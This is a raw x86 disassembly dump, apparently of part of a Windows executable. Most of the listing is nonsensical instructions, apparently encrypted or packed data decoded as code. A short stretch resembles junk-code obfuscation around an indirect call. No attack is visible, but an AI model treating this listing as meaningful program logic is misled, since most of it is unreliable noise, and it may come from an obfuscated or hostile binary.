  4030d0:	(bad)  
  4030d2:	pop    ss
  4030d3:	jo     0x403145
  4030d5:	mov    esi,0xde70707e
  4030da:	mov    eax,ds:0xb273b7e0
  4030df:	cmp    eax,0x3f7c115b
  4030e4:	leave  
  4030e5:	ret    0x7beb
  4030e8:	mov    ebp,DWORD PTR [edx-0x18]
  4030eb:	in     eax,0x51
  4030ed:	pop    ds
  4030ee:	std    
  4030ef:	sbb    eax,0x979a023e
  4030f4:	mov    ebx,DWORD PTR [edx+0x78]
  4030f7:	xor    bl,al
  4030f9:	adc    eax,0xa1c414c8
  4030fe:	(bad)  
  403100:	ret    0xb40a
  403103:	loope  0x403154
  403105:	test   eax,0xf07553a3
  40310a:	iret   
  40310b:	sub    esp,DWORD PTR [esi+eax*2]
  40310e:	xor    DWORD PTR [edi-0x33],ebp
  403111:	xor    al,0xf7
  403113:	cld    
  403114:	pop    edi
  403115:	jo     0x4030b3
  403117:	lock cmp al,0xec
  40311a:	xchg   esi,eax
  40311b:	ss (bad) 
  40311d:	imul   esi,DWORD PTR [esi],0x866c556b
  403123:	sahf   
  403124:	push   es
  403125:	inc    edx
  403126:	lods   eax,DWORD PTR ds:[esi]
  403127:	push   ebx
  403128:	pop    ds
  403129:	es icebp 
  40312b:	scas   eax,DWORD PTR es:[edi]
  40312c:	imul   edi,DWORD PTR [esi+0x7d],0xffffffc6
  403130:	gs mov cl,0x91
  403133:	or     al,0x71
  403135:	pop    ss
  403136:	mov    ebp,0xc9abf94c
  40313b:	popa   
  40313c:	mov    si,bp
  40313f:	pop    edx
  403140:	jg     0x403191
  403142:	repnz outs dx,DWORD PTR ds:[esi]
  403144:	xor    eax,0xe3a8cce8
  403149:	fsubr  st,st(7)
  40314b:	adc    cl,dl
  40314d:	aas    
  40314e:	push   ebx
  40314f:	into   
  403150:	lahf   
  403151:	dec    edi
  403152:	inc    esi
  403153:	jb     0x4030e0
  403155:	push   ds
  403156:	test   DWORD PTR [ebp-0x2232e657],esi
  40315c:	push   edx
  40315d:	retf   0xc4bb
  403160:	xor    BYTE PTR [esi],bl
  403162:	inc    ecx
  403163:	push   ds
  403164:	mov    bh,0x6
  403166:	out    0xf7,eax
  403168:	xchg   ecx,eax
  403169:	fwait
  40316a:	lea    eax,[edi-0x57245c44]
  403170:	test   eax,0x6d2b36cc
  403175:	fadd   DWORD PTR [ebx]
  403177:	and    BYTE PTR [esi],dh
  403179:	mov    al,0x55
  40317b:	imul   eax,DWORD PTR [edi-0x6dabd36],0x6d
  403182:	test   DWORD PTR [ebp-0x3f],ebx
  403185:	int3   
  403186:	and    bh,BYTE PTR [edi+ebp*1-0x15]
  40318a:	sbb    esi,edx
  40318c:	(bad)  
  40318d:	xchg   esp,eax
  40318e:	data16 jge 0x403190
  403191:	mov    al,ds:0x462870
  403196:	pop    eax
  403197:	sbb    eax,0xc85497a0
  40319c:	test   BYTE PTR [esi],ch
  40319e:	in     al,dx
  40319f:	lds    ebp,FWORD PTR [ecx+ebx*2-0x66d596f6]
  4031a6:	clc    
  4031a7:	mov    ebx,0xec982447
  4031ac:	adc    BYTE PTR ds:0xbc111dd0,ch
  4031b2:	cdq    
  4031b3:	cmp    BYTE PTR [esi+edi*2],ah
  4031b6:	out    dx,eax
  4031b7:	mov    edi,0x17b2cd92
  4031bc:	lea    eax,[ebx+0x71be21c6]
  4031c2:	adc    ebx,DWORD PTR cs:[eax-0x63]
  4031c6:	adc    esp,DWORD PTR [eax-0x35]
  4031c9:	jb     0x403229
  4031cb:	outs   dx,BYTE PTR ds:[esi]
  4031cc:	ja     0x4031df
  4031ce:	retf   
  4031cf:	call   0xc5cd:0x9d5edd1d
  4031d6:	mov    edx,DWORD PTR [eax+0x1f9f33f3]
  4031dc:	xchg   esp,eax
  4031dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031de:	jns    0x40324f
  4031e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031e1:	ret    
  4031e2:	aas    
  4031e3:	in     eax,0x79
  4031e5:	call   0x8bb6b964
  4031ea:	inc    edx
  4031eb:	es mov esi,0xa7e7b886
  4031f1:	mov    ebp,0xeef9bc47
  4031f6:	xor    DWORD PTR [eax-0x79843c0f],esp
  4031fc:	and    eax,0xc8e71406
  403201:	jo     0x40326e
  403203:	add    eax,0xd8be4d43
  403208:	inc    edi
  403209:	or     eax,DWORD PTR [ebp+0x22001d76]
  40320f:	cmp    DWORD PTR [edi],ebx
  403211:	adc    BYTE PTR [eax],bh
  403213:	and    al,0x91
  403215:	add    bl,cl
  403217:	cmp    al,0xaf
  403219:	mov    al,ds:0x1be544cd
  40321e:	stos   DWORD PTR es:[edi],eax
  40321f:	jl     0x403255
  403221:	sub    DWORD PTR [ecx+0x3fc35505],edx
  403227:	mov    BYTE PTR es:[ebx+0x6a92dbbc],bl
  40322e:	add    esi,DWORD PTR [edi+0x75d31fe1]
  403234:	sub    BYTE PTR [ebp+0x30],ah
  403237:	add    eax,0x32eb63e0
  40323c:	test   BYTE PTR [ecx],dh
  40323e:	push   ebp
  40323f:	sub    BYTE PTR [ebp-0x1c30f1f],0x78
  403246:	push   0x3b
  403248:	cmp    eax,0xf62c8068
  40324d:	jmp    0x403277
  40324f:	inc    eax
  403250:	test   BYTE PTR [edi+0x71ff0a2f],al
  403256:	xlat   BYTE PTR ds:[ebx]
  403257:	scas   eax,DWORD PTR es:[edi]
  403258:	loop   0x4031f1
  40325a:	mov    dl,0x47
  40325c:	push   esp
  40325d:	loope  0x403221
  40325f:	mov    dl,0xdc
  403261:	pusha  
  403262:	gs int3 
  403264:	add    al,0x59
  403266:	mov    bl,cl
  403268:	retf   0x6d12
  40326b:	mov    dh,0x56
  40326d:	sbb    eax,0x2595d9eb
  403272:	inc    ecx
  403273:	fwait
  403274:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403275:	mov    eax,ds:0x462c7c59
  40327a:	leave  
  40327b:	neg    BYTE PTR [eax+0x2368a8a2]
  403281:	and    bl,BYTE PTR [ecx+eax*4-0x57]
  403285:	add    DWORD PTR [eax],ebp
  403287:	loop   0x403260
  403289:	outs   dx,DWORD PTR ds:[esi]
  40328a:	inc    ebx
  40328b:	out    dx,eax
  40328c:	ret    
  40328d:	fstp   DWORD PTR [edi]
  40328f:	cdq    
  403290:	mov    ch,0x8c
  403292:	aad    0xa0
  403294:	in     al,dx
  403295:	in     eax,0x49
  403297:	mov    bl,0xb4
  403299:	mov    DWORD PTR [ebp-0x4d28476e],edx
  40329f:	pop    ds
  4032a0:	or     DWORD PTR [eax+eax*2],ebp
  4032a3:	daa    
  4032a4:	xchg   ebx,eax
  4032a5:	xchg   ecx,eax
  4032a6:	call   0xb7bbc728
  4032ab:	addr16 cld 
  4032ad:	add    BYTE PTR [ecx-0x4a],bh
  4032b0:	mov    ah,0x7f
  4032b2:	pop    ecx
  4032b3:	inc    edi
  4032b4:	xchg   BYTE PTR [ecx-0xa],dl
  4032b7:	popf   
  4032b8:	dec    ebp
  4032b9:	jmp    0x4032b0
  4032bb:	mov    edi,0x6b03c834
  4032c0:	push   ebp
  4032c1:	xchg   edx,eax
  4032c2:	les    ebp,FWORD PTR [ebx-0x8]
  4032c5:	fwait
  4032c6:	fwait
  4032c7:	loop   0x40326e
  4032c9:	mov    esi,0x90725a91
  4032ce:	mov    ah,0xa
  4032d0:	push   ebp
  4032d1:	nop
  4032d2:	out    dx,al
  4032d3:	sub    dh,BYTE PTR [esi+ebp*8]
  4032d6:	pop    es
  4032d7:	pop    es
  4032d8:	js     0x4032da
  4032da:	push   esp
  4032db:	push   esi
  4032dc:	int3   
  4032dd:	xor    al,0xdf
  4032df:	mov    bl,0x8a
  4032e1:	sbb    dl,BYTE PTR [edx-0x51e50028]
  4032e7:	aas    
  4032e8:	out    0xf3,al
  4032ea:	inc    edi
  4032eb:	clc    
  4032ec:	or     edx,eax
  4032ee:	pop    ebx
  4032ef:	pop    ecx
  4032f0:	adc    bl,bl
  4032f2:	push   ds
  4032f3:	test   ecx,edx
  4032f5:	push   esi
  4032f6:	in     eax,dx
  4032f7:	fisttp QWORD PTR [esi+0x78]
  4032fa:	ret    0x9e3b
  4032fd:	sub    DWORD PTR [edx+0x5eafe033],ecx
  403303:	dec    esi
  403304:	mov    esi,ebx
  403306:	or     DWORD PTR [ebx],esp
  403308:	scas   eax,DWORD PTR es:[edi]
  403309:	(bad)  
  40330a:	cmp    al,0xd9
  40330c:	xchg   DWORD PTR [edx+0x12],ecx
  40330f:	dec    eax
  403310:	xor    ah,BYTE PTR [eax-0x18a5c68]
  403316:	shr    DWORD PTR ds:0xc1216683,1
  40331c:	mov    ss,WORD PTR [esi]
  40331e:	and    al,0x80
  403320:	sub    al,0x92
  403322:	xchg   DWORD PTR [edx-0x1644541c],ebp
  403328:	mov    BYTE PTR [edx],bh
  40332a:	(bad)  
  40332b:	fst    DWORD PTR [edx]
  40332d:	fdivr  DWORD PTR [eax-0x4e567f5f]
  403333:	pop    esp
  403334:	push   esi
  403335:	scas   eax,DWORD PTR es:[edi]
  403336:	dec    esi
  403337:	mov    ecx,0xd8f0874b
  40333c:	scas   eax,DWORD PTR es:[edi]
  40333d:	jle    0x4032ec
  40333f:	std    
  403340:	xchg   ch,dl
  403342:	xor    al,0x1
  403344:	jbe    0x4033ae
  403346:	or     dh,BYTE PTR [esi+0x42]
  403349:	scas   al,BYTE PTR es:[edi]
  40334a:	(bad)  
  40334b:	in     eax,dx
  40334c:	std    
  40334d:	push   edx
  40334e:	or     al,0x75
  403350:	cmp    eax,0x9e204edc
  403355:	out    0x8e,eax
  403357:	sbb    BYTE PTR [ecx-0x72],dl
  40335a:	jb     0x4033cc
  40335c:	push   0xe9fad1f9
  403361:	fistp  WORD PTR [esi+0x10]
  403364:	lock ds jnp 0x4033e0
  403368:	div    DWORD PTR [ecx]
  40336a:	push   ecx
  40336b:	adc    ebx,esi
  40336d:	xor    ch,BYTE PTR [ebp+0x7dab27b7]
  403373:	jg     0x403323
  403375:	in     eax,0xaf
  403377:	dec    edx
  403378:	shr    BYTE PTR [eax],cl
  40337a:	or     edi,DWORD PTR [esi+ebx*8+0x30]
  40337e:	hlt    
  40337f:	pushf  
  403380:	adc    al,cl
  403382:	adc    dh,cl
  403384:	adc    esp,ebp
  403386:	in     al,dx
  403387:	or     eax,0xa6982242
  40338c:	inc    edx
  40338d:	jbe    0x4033ff
  40338f:	data16 mov bl,0xed
  403392:	out    dx,eax
  403393:	loop   0x403325
  403395:	mov    al,0x59
  403397:	scas   eax,DWORD PTR es:[edi]
  403398:	mov    ah,0x27
  40339a:	jl     0x403327
  40339c:	jne    0x4033a6
  40339e:	imul   edi,edx
  4033a1:	mov    ebx,DWORD PTR [ebp+0xc]
  4033a4:	xor    eax,ecx
  4033a6:	add    eax,edx
  4033a8:	jmp    0x403687
  4033ad:	jecxz  0x4033d3
  4033af:	fcom   DWORD PTR [edx]
  4033b1:	out    0xd2,eax
  4033b3:	icebp  
  4033b4:	icebp  
  4033b5:	pop    es
  4033b6:	xchg   edx,eax
  4033b7:	aaa    
  4033b8:	aas    
  4033b9:	fimul  DWORD PTR ds:0x143ac2b0
  4033bf:	jo     0x403431
  4033c1:	mov    esi,0x9070707e
  4033c6:	aas    
  4033c7:	call   0x9c76:0xef6f8399
  4033ce:	lea    esp,[esi-0x53]
  4033d1:	xchg   esp,eax
  4033d2:	sar    DWORD PTR [edi+0x4c7eb1ae],1
  4033d8:	out    dx,eax
  4033d9:	jge    0x403450
  4033db:	ret    0x1e20
  4033de:	in     al,dx
  4033df:	add    eax,0xc8d1309d
  4033e4:	das    
  4033e5:	repnz lods al,BYTE PTR ds:[esi]
  4033e7:	ins    DWORD PTR es:[edi],dx
  4033e8:	sub    ebp,DWORD PTR [esi+edi*8]
  4033eb:	push   ss
  4033ec:	cld    
  4033ed:	dec    ebp
  4033ee:	add    eax,0x92eed705
  4033f3:	imul   esi,DWORD PTR ds:0xb8f3a589,0x9d5826e4
  4033fd:	lock sahf 
  4033ff:	push   ebp
  403400:	jo     0x40340b
  403402:	shl    BYTE PTR [edx-0x1519575],1
  403408:	xchg   edx,eax
  403409:	and    al,0x6e
  40340b:	cmp    al,0x78
  40340d:	cmp    ebp,DWORD PTR [edx-0x54]
  403410:	inc    ecx
  403411:	push   esi
  403412:	pavgw  mm0,QWORD PTR ss:[edx-0x83f7eb7]
  40341a:	sti    
  40341b:	adc    eax,0x15dbd956
  403420:	jp     0x403403
  403422:	inc    ebp
  403423:	shl    ebp,0x1
  403426:	push   esp
  403427:	pop    ds
  403428:	loope  0x4033d8
  40342a:	add    eax,esp
  40342c:	xchg   ebx,eax
  40342d:	push   es
  40342e:	call   0x840f079d
  403433:	test   al,0x3f
  403435:	sbb    ebp,ebp
  403437:	jg     0x403453
  403439:	or     esp,esp
  40343b:	pop    ds
  40343c:	push   ebx
  40343d:	lahf   
  40343e:	mov    eax,0x60de1ffc
  403443:	mov    ds,WORD PTR [edx+0x5e]
  403446:	sti    
  403447:	or     esp,edi
  403449:	cmp    BYTE PTR cs:[ebp+0x4d407eb7],ah
  403450:	mov    WORD PTR [ecx],fs
  403452:	add    al,0xec
  403454:	xor    bl,BYTE PTR [esi-0x3f]
  403457:	cmp    eax,0x3a1841e3
  40345c:	cmp    DWORD PTR [esi-0x468b7b4d],eax
  403462:	cdq    
  403463:	ins    BYTE PTR es:[edi],dx
  403464:	les    eax,FWORD PTR [ebp-0x7f]
  403467:	stos   BYTE PTR es:[edi],al
  403468:	xor    eax,0x5b712cbe
  40346d:	call   0x5c7aa378
  403472:	xor    ah,BYTE PTR [esi]
  403474:	mov    al,ds:0x4e4d4f6b
  403479:	sar    DWORD PTR [edi-0x5d977871],0x25
  403480:	push   0x43
  403482:	xor    al,0x71
  403484:	pushf  
  403485:	mov    dl,0x26
  403487:	mov    al,0x62
  403489:	or     ebp,DWORD PTR [eax]
  40348b:	sub    ah,ch
  40348d:	push   esp
  40348e:	call   0x3ad85c86
  403493:	mov    ebp,0x34157619
  403498:	inc    eax
  403499:	xor    eax,ebx
  40349b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40349c:	lods   al,BYTE PTR ds:[esi]
  40349d:	hlt    
  40349e:	mov    bl,dl
  4034a0:	(bad)  
  4034a1:	sbb    bh,BYTE PTR [edx]
  4034a3:	mov    ds:0x2e2273ab,eax
  4034a8:	and    ecx,0x86aface9
  4034ae:	jb     0x4034eb
  4034b0:	cmc    
  4034b1:	scas   eax,DWORD PTR es:[edi]
  4034b2:	shl    DWORD PTR [ecx+0x7d],1
  4034b5:	bound  ecx,QWORD PTR [esi-0x71fcbcfa]
  4034bb:	popf   
  4034bc:	cmc    
  4034bd:	xchg   edi,eax
  4034be:	dec    esi
  4034bf:	je     0x4034a2
  4034c1:	test   BYTE PTR [edx+0x3e],ch
  4034c4:	and    al,0x93
  4034c6:	mov    edi,0xfab53e90
  4034cb:	xchg   esp,eax
  4034cc:	(bad)  
  4034ce:	or     bl,BYTE PTR [edi]
  4034d0:	sti    
  4034d1:	repz lock pop es
  4034d4:	out    dx,eax
  4034d5:	sbb    eax,DWORD PTR [edx]
  4034d7:	sbb    DWORD PTR [edi+ecx*2],0xa0da6eae
  4034de:	fucomip st,st(6)
  4034e0:	cli    
  4034e1:	xlat   BYTE PTR ds:[ebx]
  4034e2:	pushf  
  4034e3:	sub    al,0x5f
  4034e5:	push   edx
  4034e6:	jb     0x40355a
  4034e8:	sbb    ebx,DWORD PTR ds:0x3f1e5507
  4034ee:	loopne 0x4034b4
  4034f0:	push   0x42
  4034f2:	test   BYTE PTR [ebp+0x40a6a4f1],bh
  4034f8:	bound  edi,QWORD PTR [edi+ebp*2-0x44532ed4]
  4034ff:	imul   esp,DWORD PTR [ebx+0x7af41f8e],0x17
  403506:	push   ds
  403507:	inc    ebx
  403508:	mov    dh,0x3
  40350a:	call   0x78d6:0x3ad01805
  403511:	xlat   BYTE PTR ds:[ebx]
  403512:	(bad)  
  403513:	mov    dl,0x91
  403515:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403516:	pop    esi
  403517:	mov    edx,0x88a0ac08
  40351c:	mov    esp,DWORD PTR [ecx+edi*4+0x4f1c3450]
  403523:	ret    0x4a3d
  403526:	jl     0x4034fd
  403528:	cmp    eax,0x7f8bc89c
  40352d:	xchg   edx,eax
  40352e:	jo     0x403508
  403530:	fld    TBYTE PTR ds:0xdaa9c1a
  403536:	je     0x403564
  403538:	sbb    al,0x14
  40353a:	sub    al,0x21
  40353c:	pop    es
  40353d:	scas   al,BYTE PTR es:[edi]
  40353e:	xor    BYTE PTR [ebx],cl
  403540:	adc    al,0xb8
  403542:	test   DWORD PTR [eax-0x47655e36],eax
  403548:	mov    ?,WORD PTR [edx]
  40354a:	imul   ebx,DWORD PTR [ebx+0x4b],0x3f2094ed
  403551:	aas    
  403552:	sub    cl,ch
  403554:	cli    
  403555:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403556:	mov    esi,0xdef6e4fa
  40355b:	push   esp
  40355c:	addr16 xchg edx,eax
  40355e:	scas   al,BYTE PTR es:[edi]
  40355f:	xor    al,0xf1
  403561:	in     eax,dx
  403562:	pop    ds
  403563:	mov    ch,0x65
  403565:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403566:	xor    esi,DWORD PTR [edi]
  403568:	or     BYTE PTR [esi+esi*4-0x74],cl
  40356c:	outs   dx,DWORD PTR ds:[esi]
  40356d:	mov    esi,0x61f1ab6c
  403572:	dec    eax
  403573:	leave  
  403574:	and    cl,BYTE PTR [edx]
  403576:	cmp    ebx,ebp
  403578:	pop    ebx
  403579:	mov    BYTE PTR [ebx+0x70],dh
  40357c:	xchg   esi,eax
  40357d:	xor    eax,0x52755512
  403582:	test   DWORD PTR [esi],edx
  403584:	iret   
  403585:	pop    ebx
  403586:	or     DWORD PTR [eax+ebx*4],0x6d17d34
  40358d:	mov    edx,0x29e97968
  403592:	hlt    
  403593:	sub    ch,ah
  403595:	fmul   st(3),st
  403597:	ficom  DWORD PTR [ebx]
  403599:	test   DWORD PTR [esi+ebp*2+0x2f42a91f],esi
  4035a0:	mov    al,0xc6
  4035a2:	push   0x4da9cccc
  4035a7:	dec    edx
  4035a8:	ss or  ch,bh
  4035ab:	sahf   
  4035ac:	popa   
  4035ad:	or     al,0xb
  4035af:	cld    
  4035b0:	cmp    al,0xe0
  4035b2:	mov    bl,0xc5
  4035b4:	push   cs
  4035b5:	dec    ebx
  4035b6:	into   
  4035b7:	push   gs
  4035b9:	pop    ecx
  4035ba:	pop    ss
  4035bb:	cld    
  4035bc:	ins    DWORD PTR es:[edi],dx
  4035bd:	rcl    BYTE PTR [eax],cl
  4035bf:	push   cs
  4035c0:	ja     0x4035df
  4035c2:	sti    
  4035c3:	(bad)  
  4035c5:	ins    DWORD PTR es:[edi],dx
  4035c6:	rol    BYTE PTR [edx+0x1d],cl
  4035c9:	pop    ebx
  4035ca:	fwait
  4035cb:	out    dx,al
  4035cc:	jae    0x403551
  4035ce:	or     al,0xe
  4035d0:	dec    eax
  4035d1:	mov    DWORD PTR [ecx],edx
  4035d3:	jae    0x40357a
  4035d5:	arpl   WORD PTR [ebp+0x64],bp
  4035d8:	fidivr DWORD PTR [edi+0x1e]
  4035db:	cwde   
  4035dc:	xchg   ah,dl
  4035de:	dec    ecx
  4035df:	mov    bh,0x82
  4035e1:	dec    esp
  4035e2:	xor    eax,0x336f1764
  4035e7:	cmp    esi,DWORD PTR [ebx+0x7c7210b8]
  4035ed:	push   es
  4035ee:	inc    BYTE PTR [ecx+ebp*4-0x4f]
  4035f2:	inc    DWORD PTR [ebp+0x72ba2154]
  4035f8:	xor    DWORD PTR [eax-0x65],0x1655e057
  4035ff:	mov    al,0x46
  403601:	xor    eax,0xc541f326
  403606:	mov    DWORD PTR [ebx],edx
  403608:	mov    eax,0xf541fc4a
  40360d:	jle    0x4035fe
  40360f:	shr    DWORD PTR [ebp-0x49],0x79
  403613:	cli    
  403614:	test   eax,0xc99867c5
  403619:	in     al,dx
  40361a:	shl    DWORD PTR [edx],1
  40361c:	sub    esi,DWORD PTR [edi-0x4a]
  40361f:	in     eax,dx
  403620:	sub    dh,BYTE PTR [ebx+0x58]
  403623:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403625:	mov    ?,WORD PTR [ecx]
  403627:	int3   
  403628:	mov    bh,0x8f
  40362a:	pop    ebp
  40362b:	aas    
  40362c:	add    al,BYTE PTR [ecx-0x6f]
  40362f:	(bad)  
  403630:	add    al,dh
  403632:	push   ebp
  403633:	jno    0x403622
  403635:	ss shl cl,cl
  403638:	aaa    
  403639:	pop    ss
  40363a:	xchg   ecx,eax
  40363b:	push   ss
  40363c:	xor    dl,dh
  40363e:	jmp    0x3649:0x394ab23a
  403645:	in     al,0xd4
  403647:	(bad)  
  403648:	iret   
  403649:	sar    DWORD PTR [edx+edi*1-0x39],1
  40364d:	sbb    DWORD PTR [eax*4+0x26df1f54],edx
  403654:	ror    DWORD PTR [esi],0x91
  403657:	sub    al,0xea
  403659:	dec    ebp
  40365a:	rol    DWORD PTR [edx-0x2542b8b3],1
  403660:	cdq    
  403661:	fdiv   DWORD PTR [ecx]
  403663:	jmp    0x4036ca
  403665:	in     eax,0xda
  403667:	inc    esp
  403668:	aam    0xb8
  40366a:	fs inc ebp
  40366c:	jle    0x40368d
  40366e:	mov    eax,0x786a783a
  403673:	addr16 cmp al,0xa
  403677:	pop    edi
  403678:	xor    eax,0xc530ec66
  40367d:	imul   eax,DWORD PTR [ecx+0x19],0x7a796e54
  403684:	push   edx
  403685:	push   esi
  403686:	mov    eax,0x9c03848a
  40368b:	jb     0x4036bf
  40368d:	add    BYTE PTR [eax+0x458b3704],cl
  403693:	cld    
  403694:	xor    eax,ecx
  403696:	lea    edx,[edx+eax*1+0x32729c]
  40369d:	mov    eax,DWORD PTR [ebp-0x4]
  4036a0:	xor    eax,ecx
  4036a2:	mov    esi,0xffcd8d64
  4036a7:	sub    esi,eax
  4036a9:	add    esi,DWORD PTR [ebp+0x10]
  4036ac:	cmp    edx,esi
  4036ae:	jbe    0x4030ad
  4036b4:	pop    ebx
  4036b5:	mov    eax,0xf89c8530
  4036ba:	pop    edi
  4036bb:	pop    esi
  4036bc:	leave  
  4036bd:	ret    0xc
  4036c0:	push   ebp
  4036c1:	mov    ebp,esp
  4036c3:	sub    esp,0x58
  4036c6:	mov    DWORD PTR ds:0x42fded,0x17
  4036d0:	cmp    DWORD PTR ds:0x42fded,0x0
  4036d7:	je     0x40372c
  4036dd:	cmp    DWORD PTR ds:0x42fded,0x7
  4036e4:	jne    0x4036fc
  4036ea:	push   0x0
  4036ec:	push   0x25f8
  4036f1:	push   0x8523
  4036f6:	call   DWORD PTR ds:0x42e3d7
  4036fc:	cmp    DWORD PTR ds:0x42fded,0x8
  403703:	jne    0x403717
  403709:	xor    eax,eax
  40370b:	or     eax,DWORD PTR ds:0x42fded
  403711:	dec    eax
  403712:	mov    ds:0x42fded,eax
  403717:	mov    eax,ds:0x42fded
  40371c:	dec    eax
  40371d:	mov    ds:0x42fded,eax
  403722:	jmp    0x4036d0
  403727:	adc    eax,0xdf
  40372c:	mov    ecx,DWORD PTR [ebp+0x8]
  40372f:	add    DWORD PTR ds:0x42e7f3,0x693e
  403739:	mov    eax,0x8a3e
  40373e:	adc    DWORD PTR ds:0x42e7f7,0x5ea2
  403748:	xor    ax,WORD PTR [ecx+0x20]
  40374c:	adc    DWORD PTR ds:0x42fe0d,ecx
  403752:	mov    ecx,0x3b04
  403757:	and    DWORD PTR ds:0x42e813,0x42e21c
  403761:	add    ax,cx
  403764:	mov    DWORD PTR ds:0x42fe7a,0x1b71
  40376e:	movzx  eax,ax
  403771:	mov    DWORD PTR [ebp-0xc],eax
  403774:	or     DWORD PTR ds:0x42e224,0x7677
  40377e:	mov    BYTE PTR [ebp-0x1],0x7f
  403782:	not    ecx
  403784:	lea    eax,[ebp-0x1]
  403787:	mov    DWORD PTR [ebp-0x10],eax
  40378a:	or     DWORD PTR ds:0x42e80f,ecx
  403790:	jmp    0x403af0
  403795:	out    0x52,eax
  403797:	out    0x78,al
  403799:	jno    0x40374f
  40379b:	in     eax,0x71
  40379d:	or     BYTE PTR [edx+0x68],bl
  4037a0:	and    DWORD PTR [edi+0x36],ebp
  4037a3:	mov    al,0xa8
  4037a5:	js     0x4037b8
  4037a7:	jo     0x403819
  4037a9:	cmp    eax,0xbd70707d
  4037ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037af:	test   DWORD PTR [ebx+ebx*1+0x4b],edx
  4037b3:	ja     0x40378b
  4037b5:	inc    ecx
  4037b6:	push   esi
  4037b7:	jecxz  0x403739
  4037b9:	sti    
  4037ba:	in     eax,dx
  4037bb:	xor    eax,0x23906491
  4037c0:	xchg   esi,eax
  4037c1:	push   ebx
  4037c2:	lock jp 0x4037e9
  4037c5:	sbb    al,0x6a
  4037c7:	rcl    BYTE PTR [edi+esi*1],1
  4037ca:	sbb    DWORD PTR [edi+0x51eced52],eax
  4037d0:	(bad)
  4037d4:	(bad)  
  4037d5:	(bad)  
  4037d6:	out    dx,eax
  4037d7:	dec    ebp
  4037d8:	out    0xb8,eax
  4037da:	pusha  
  4037db:	mov    bh,BYTE PTR [edi+0x53]
  4037de:	mov    eax,ds:0x24dfc040
  4037e3:	adc    ecx,DWORD PTR [esi-0x62]
  4037e6:	xor    esp,ebx
  4037e8:	push   ss
  4037e9:	jmp    0xeb0e:0x3f2d9ca9
  4037f0:	imul   ebp,ecx,0x6d
  4037f3:	lods   eax,DWORD PTR ds:[esi]
  4037f4:	mov    eax,ds:0x989b0a1
  4037f9:	dec    eax
  4037fa:	mov    DWORD PTR [esi+0x21],ebx
  4037fd:	jecxz  0x403817
  4037ff:	shr    DWORD PTR [ecx+edx*1-0x6e],0x23
  403804:	test   ah,0x29
  403807:	arpl   WORD PTR [edi-0x1f],si
  40380a:	test   esp,eax
  40380c:	cli    
  40380d:	or     esp,ecx
  40380f:	mov    bh,0x3d
  403811:	lods   al,BYTE PTR ds:[esi]
  403812:	dec    esp
  403813:	mov    BYTE PTR [edx+eiz*1],cl
  403816:	pushf  
  403817:	popa   
  403818:	jb     0x4037ae
  40381a:	add    eax,DWORD PTR [ebx+eax*2]
  40381d:	pop    edx
  40381e:	xchg   BYTE PTR [edx+0x32526081],ah
  403824:	or     al,0xc2
  403826:	mov    ds:0xb73a559e,eax
  40382b:	push   0xfffffff5
  40382d:	push   ebx
  40382e:	dec    edi
  40382f:	xchg   ebp,eax
  403830:	jmp    0x4757:0xdcda28e0
  403837:	fisttp DWORD PTR [ebx]
  403839:	ret    
  40383a:	mov    WORD PTR [ecx-0x9],?
  40383d:	sbb    DWORD PTR [ebx],esi
  40383f:	hlt    
  403840:	mov    dh,0x37
  403842:	repz cmc 
  403844:	bnd ret 0x204a
  403848:	mov    BYTE PTR [esi+0x55bfdb69],cl
  40384e:	push   DWORD PTR [ecx]
  403850:	loopne 0x4038cb
  403852:	mov    bl,0x91
  403854:	mov    gs,WORD PTR [ebx-0x35]
  403857:	or     BYTE PTR [ebp+ebp*2+0x33f67ec],bh
  40385e:	xchg   ecx,eax
  40385f:	fisub  WORD PTR [edx+0x5e]
  403862:	pop    eax
  403863:	faddp  st(5),st
  403865:	pushf  
  403866:	sbb    eax,0x19dbd8f4
  40386b:	pop    ss
  40386c:	xchg   BYTE PTR [ebx+0x181733c1],dh
  403872:	sar    BYTE PTR [edx+0x34bb4dab],0xd6
  403879:	xor    al,BYTE PTR [edx+0x61a306af]
  40387f:	test   eax,0x661f33ce
  403884:	into   
  403885:	and    bh,cl
  403887:	sub    dh,bh
  403889:	(bad)
  40388c:	pop    esi
  40388d:	iret   
  40388e:	mov    ds:0x42dbb520,al
  403893:	ficom  WORD PTR [edx]
  403895:	call   0x1c43:0xa79c7a7e
  40389c:	mov    edi,0x1c3e99bb
  4038a1:	nop
  4038a2:	mov    ch,0x7b
  4038a4:	or     edi,DWORD PTR [ecx+edx*2]
  4038a7:	xchg   DWORD PTR [esi+ebx*4],ebx
  4038aa:	iret   
  4038ab:	dec    ebp
  4038ac:	inc    edi
  4038ad:	dec    ebp
  4038ae:	cmp    DWORD PTR [ecx+0x767fce8f],edx
  4038b4:	lock lds eax,FWORD PTR ds:0xf88736f3
  4038bb:	rcl    BYTE PTR ds:0xac880797,1
  4038c1:	sbb    eax,0x3f84509a
  4038c6:	mov    BYTE PTR [ecx],ch
  4038c8:	imul   ecx,esp,0x520e842c
  4038ce:	imul   esp,ecx,0x29
  4038d1:	mov    dl,0x3a
  4038d3:	xchg   edx,eax
  4038d4:	mov    esi,0xaf4b87b2
  4038d9:	fwait
  4038da:	mov    al,ds:0xe28a808a
  4038df:	xor    BYTE PTR [edx-0x41dff453],al
  4038e5:	dec    esi
  4038e6:	sub    eax,DWORD PTR [ecx-0x4d]
  4038e9:	addr16 push 0xfffffff3
  4038ec:	dec    edx
  4038ed:	arpl   si,dx
  4038ef:	and    eax,0xacac54dd
  4038f4:	sub    BYTE PTR [esi+0x732a56ce],dh
  4038fa:	adc    eax,0x77ab996c
  4038ff:	shr    BYTE PTR [esi-0x77],0xfd
  403903:	cmp    BYTE PTR [eax-0x14aba70f],ch
  403909:	pop    esi
  40390a:	aas    
  40390b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40390c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40390d:	aam    0xca
  40390f:	push   esi
  403910:	jg     0x403989
  403912:	cmp    eax,0x9f8780c4
